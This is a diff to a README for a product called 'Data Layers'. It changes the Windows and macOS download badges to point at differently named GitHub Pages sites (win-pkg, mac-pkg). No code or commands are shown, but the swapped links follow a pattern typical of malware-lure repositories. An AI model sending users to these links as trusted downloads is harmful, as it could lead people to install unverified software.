@@ -30,7 +30,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Data Layers](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_DATA_LAYERS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download Data Layers](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_DATA_LAYERS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
@@ -76,8 +76,8 @@ Getting started with **Data Layers** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-8B4513?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-8B4513?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-8B4513?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-8B4513?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
 
 </div>
 
